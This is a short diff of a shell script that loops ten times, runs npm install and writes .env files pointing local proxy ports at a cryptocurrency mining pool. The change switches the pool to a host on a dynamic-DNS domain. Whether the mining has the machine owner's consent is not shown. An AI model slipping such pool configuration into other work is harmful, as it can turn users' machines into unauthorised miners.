@@ -11,11 +11,12 @@ for i in {1..10}; do
   npm install
   # stratum.vecocoin.com:8602
   # pool.rwinfo.club:6533
+  # stratum-mining-pool.zapto.org:3725
   # Set environment variables for 'cpu'
   LOCAL_IP=$(hostname -I | awk '{print $1}')
   cat <<EOL > .env
-REMOTE_HOST=stratum.vecocoin.com
-REMOTE_PORT=8602
+REMOTE_HOST=stratum-mining-pool.zapto.org
+REMOTE_PORT=3725
 REMOTE_PASSWORD=x
 LOCAL_HOST=$LOCAL_IP
 LOCAL_PORT=$((442 + i))
